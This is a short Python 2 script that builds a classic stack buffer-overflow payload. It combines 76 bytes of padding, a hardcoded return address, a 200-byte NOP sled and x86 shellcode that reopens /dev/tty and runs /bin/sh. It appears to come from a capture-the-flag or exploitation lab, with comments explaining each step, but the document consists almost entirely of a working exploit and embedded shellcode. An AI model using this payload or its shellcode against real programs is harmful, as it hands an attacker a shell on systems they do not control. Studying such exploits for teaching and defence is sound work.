# Shellcode injection that relies on a buffer overflow.
# There is a buffer declared on the stack that is at 76 bytes before the address
# of the instruction pointer %eip. This will override the address stored in the 
# instruction pointer to point to the address 4 bytes after.
# There lies some shellcode meant to execute /bin/sh.
import struct
pad = '0' * 76
# struct allows to represent a value in binary form, with the correct endianness
new_addr = struct.pack("I", 0xbffff780)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68/sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOPs = "\x90" * 200
print pad + new_addr + NOPs + shellcode
